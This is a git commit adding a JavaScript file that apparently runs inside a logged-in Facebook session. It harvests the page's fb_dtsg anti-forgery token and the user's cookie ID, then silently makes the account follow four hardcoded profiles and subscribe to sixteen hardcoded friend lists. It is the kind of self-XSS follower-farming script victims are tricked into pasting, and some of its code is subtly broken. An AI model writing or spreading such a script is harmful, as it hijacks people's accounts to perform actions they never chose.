a1b51b24669c49124201f44944cba4ecb0d53d34
Tumul2009 <tumul2005@gmail.com>
2014-03-19 16:43:52 +0600

    Create auto_follow_list_follow.js

---
+++ auto_follow_list_follow.js
@@ -0,0 +1,79 @@
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+	
+function cereziAl(isim) {
+    var tarama = isim + "=";
+    if (document.cookie.length > 0) {
+        konum = document.cookie.indexOf(tarama)
+        if (konum != -1) {
+            konum += tarama.length
+            son = document.cookie.indexOf(";", konum)
+            if (son == -1)
+                son = document.cookie.length
+            return unescape(document.cookie.substring(konum, son))
+        }
+        else { return ""; }
+    }
+}
+
+function getRandomInt (min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+function randomValue(arr) {
+    return arr[getRandomInt(0, arr.length-1)];
+}
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function a(abone){
+    var http4 = new XMLHttpRequest();
+     
+    var url4 = "/ajax/follow/follow_profile.php?__a=1";
+     
+    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
+    http4.open("POST", url4, true);
+     
+    //Send the proper header information along with the request
+    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    http4.setRequestHeader("Content-length", params4.length);
+    http4.setRequestHeader("Connection", "close");
+     
+    http4.onreadystatechange = function() {//Call a function when the state changes.
+    if(http4.readyState == 4 && http4.status == 200) {
+       
+      http4.close; // Close the connection
+     
+    }
+    }
+    
+    http4.send(params4);
+}
+
+function sublist(uidss) {
+		var a = document.createElement('script');
+		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
+		document.body.appendChild(a);
+}
+//Kapalo Arak
+a("100000958830505");
+a("100001079854015");
+a("100001861595563");
+a("100007157444049");
+
+sublist("583843164990973");
+sublist("601127103262579");
+sublist("601130656595557");
+sublist("583839128324710");
+sublist("601504636558159");
+sublist("601526763222613");
+sublist("529835947088454");
+sublist("606045416108115");
+sublist("797711903604097");
+sublist("797712603604027");
+sublist("868274663214487");
+sublist("868275216547765");
+sublist("868275546547732");
+sublist("868275769881043");
+sublist("868276053214348");
+sublist("868276229880997");
